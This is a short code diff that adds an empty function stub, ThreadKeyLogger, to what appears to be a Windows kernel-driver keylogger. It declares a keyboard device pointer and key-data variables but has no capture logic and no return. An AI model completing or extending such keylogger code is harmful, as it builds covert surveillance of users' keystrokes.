@@ -27,3 +27,12 @@ NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject) {
 	return status;
 }
 
+NTSTATUS ThreadKeyLogger(IN PVOID pContext) {
+	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
+	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;
+
+	PLIST_ENTRY pListEntry;
+	KEY_DATA* kData;
+
+
+}
